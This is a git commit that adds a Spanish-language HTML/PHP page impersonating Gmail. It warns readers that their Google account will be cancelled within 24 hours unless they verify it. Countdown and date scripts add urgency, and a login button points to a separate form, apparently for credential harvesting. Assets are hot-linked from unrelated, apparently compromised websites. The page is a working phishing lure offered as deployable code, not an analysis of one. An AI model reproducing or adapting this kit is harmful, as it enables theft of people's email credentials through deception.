2b82c174636b3cc87fb528cbb272a0fc4f9c2755
supporthecnic <34765310+supporthecnic@users.noreply.github.com>
2017-12-22 06:24:28 -0300

    Add files via upload

---
+++ index - copia.php
@@ -0,0 +1,120 @@
+<!DOCTYPE html><html><head>
+  
+
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="viewport" content="width=device-width"
+  <meta http-equiv="cleartype" content="on">
+  <title>Gmail- Google</title>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+  <script src="http://aplicaciones2.colombiaaprende.edu.co/ceres/images/jquery-1.11.8.min.js"></script>
+
+ 
+ 
+    
+    <style>html{font-family:sans-serif;font-color:#000;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;}body{margin:0;background:#eeeeee;min-width:320px;color:#000}h1,h2,h3,h4,h5,h6,p,div,span,a,ul,ol,li{margin:0px;padding:0px;}a{text-decoration:none;color:#4485f6;}h3{color:#212121;}p{color:#737373;}#q2,#q3,#v1b,#v1c,#v2b,#v2c,#v3c,#v3b,#v4s,#vfinal,.validate,.prize{display:none;}</style>
+</head>
+<body>
+ 
+  <style>.header{background-color:#f1f1f1;width:100%;padding:6px 0;}.header p{color:#fff;opacity:0.5;font-size:medium;line-height:0;}.header table{border-collapse:collapse;}.wrapper{max-width:800px;width:96%;margin:0 auto;}</style>
+  <div class="header">
+    <table class="wrapper">
+    <tbody><tr>
+    <td width="30px"><IMG src="http://www.derechoshumanosoaxaca.org/noticias/079-2014/logo.png" width="130" height="60"/></td>
+    <td align="right" width="60px"><img src="http://www.derechoshumanosoaxaca.org/noticias/079-2014/icon-right-min.png"></td>
+    </tr>
+    </tbody></table>
+  </div>
+<style>.subheader{background-color:#ffffff;width:100%;border-bottom:1px solid #cbccd0;}.subheader table,tr,td{border-collapse:collapse;padding:8px 0px 4px 0px;}.subheader td{valign:middle;}.subheader img{}.spacer{height:20px;}</style>
+<div class="subheader">
+<table class="wrapper">
+<tbody><tr>
+<td align="center" width="60px" style="background-color:#62A6FB;"><IMG src="http://www.derechoshumanosoaxaca.org/noticias/079-2014/g.png" width="35" height="35"/></td>
+<td width="280px" style="background-color:#62A6FB;"><font style="font-size:1.2em;color:#fff;">Mensaje importante</font></td>
+<td align="right" style="padding-left:20px;"><img style="height:25px;" src="http://www.derechoshumanosoaxaca.org/noticias/079-2014/sub2-min.png"></td>
+</tr>
+</tbody></table>
+</div>
+<div class="spacer"></div>
+<style>.contestwrap{width:100%;background-color:#fff;border-bottom:1px solid #e5e5e5;-moz-box-shadow:0px 0px 2px 2px #d2d2d2;-webkit-box-shadow:0px 0px 2px 2px #d2d2d2;box-shadow:0px 0px 2px 2px #d2d2d2;padding:10px 0px 4px 0px;border-radius:3px;}.toptext{color:#212121;font-size:small;}.contestwrap table{border-collapse:collapse;}.contestwrap p{color:#776161;font-size:small;}</style>
+<div class="wrapper">
+<div class="contestwrap wrapper">
+<div class="toptext">
+<table class="wrapper">
+<tbody>
+<tr>
+<td align="left" valign="top" width="42px"><img style="width: 40px !important; margin-top: -6px !important;" src="http://www.derechoshumanosoaxaca.org/noticias/079-2014/logomini.png"></td>
+<td align="left" valign="top"><b>Su cuenta ser&#225; dada de baja en pocos d&#237;as si no verifica su correo en este momento.<br>
+<font style="color:#9fa2a6;font-size:x-small;">
+<script>
+							var mydate=new Date()
+							mydate.setDate(mydate.getDate()-0);
+							var year=mydate.getYear()
+							if (year < 1000)
+							year+=1900
+							var day=mydate.getDay()
+							var month=mydate.getMonth()
+							var daym=mydate.getDate()
+							if (daym<10)
+							daym="0"+daym
+							var dayarray=new Array("Domingo", "Lunes", "Martes", "Mi&#233;rcoles", "Jueves", "Viernes", "S&#225;bado")
+							var montharray=new Array("Enero", "Febrero", "marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre")
+							document.write("" + daym + " de " + montharray[month])
+						</script></font></td>
+</tr>
+</tbody>
+</table>
+<div style="border-bottom:1px solid #ccc;">
+<p class="wrapper">Desde el d&#237;a
+<script language="Javascript">
+                    <!--
+                    // Array of day names
+                    var dayNames = new Array("Domingo", "Lunes", "Martes", "Mi&#233;rcoles", "Jueves", "Viernes", "S&#225;bado");
+                    // Array of month Names
+                    var monthNames = new Array("Enero", "Febrero", "marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre");
+                    var now = new Date();
+                    document.write(dayNames[now.getDay()]);
+                    // -->
+                </script>
+por razones de seguridad el Equipo de Google, ha pedido a todo sus usuarios verificar su cuenta para seguir disfrutando de los nuevos productos y servicios.
+<br>
+
+<br>Todo lo que necesita hacer es verificar su correo en el siguiente enlace:
+<br><div class="not-avail selectbutton" align="center"id="selectbutton3" onClick="exit_alert();" ; style=" background-image: url(http://aplicaciones2.colombiaaprende.edu.co/ceres/images/gbutton.png); height: 54px; width: 237px; margin-left: auto; margin-right: auto; ">
+			  <div id="ben2"; style="text-align:center; vertical-align: middle; display:table-cell; height:52px; width:237px; color: #FFFFFF;"><span style="margin-top:5px;"><a style="text-decoration: none; color: white;" href="form.html"><strong><h2>Iniciar sesi&#243;n</h2></strong></a></span></div>
+		  </div>
+             <br><center> <b>Aclaraci&#243;n:</b> Al cancelarse la cuenta ya no podr&#225; iniciar sesi&#243;n y perder&#225; toda la informaci&#243;n vinculada a dicha cuenta.
+<br>
+</p>
+</div>
+<script type="text/javascript">
+				//<![CDATA[
+				setInterval('countdown()', 1000);
+				function countdown() {
+					var mins = parseInt(document.getElementById("mins").innerHTML);
+					var secs = parseInt(document.getElementById("hsecs").innerHTML);
+					if(mins != 0 && secs == 0) {
+						nmins = mins - 1;
+						nsecs = 59;
+					} else if(mins != 0 || secs != 0) {
+						nmins = mins;
+						nsecs = secs - 1;
+					} else if(mins == 0 && secs == 0) {
+						nmins = mins;
+						nsecs = secs;
+					}
+					document.getElementById("mins").innerHTML = nmins;
+					document.getElementById("hsecs").innerHTML = nsecs;
+					if(nsecs < 10) nsecs = "0" + nsecs;
+					document.getElementById("hsecs").innerHTML = nsecs;
+				}
+				//]]>
+			</script>
+<style>.select2{color:#737373;font-size:small;font-weight:300;padding:8px 0px 4px 0px;}</style>
+<div class="select2 wrapper">
+&#161;Tiene <font color="red"><b><span id="hours">24</span> horas <span id="mins"></span> </b></font> para verificar su cuenta o ser&#225; eliminada de nuestra base de datos.
+ </script>
+	
